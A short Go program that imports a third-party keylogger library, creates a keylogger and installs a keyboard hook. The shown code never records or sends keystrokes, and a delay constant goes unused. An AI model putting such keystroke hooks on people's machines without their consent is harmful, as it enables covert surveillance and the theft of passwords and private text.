package main

import (
	"gopkg.in/kindlyfire/go-keylogger"
)

const (
	delayKeyfetchMS = 5
)

func main() {
	kl := keylogger.NewKeylogger()
	kl.Hook()
}
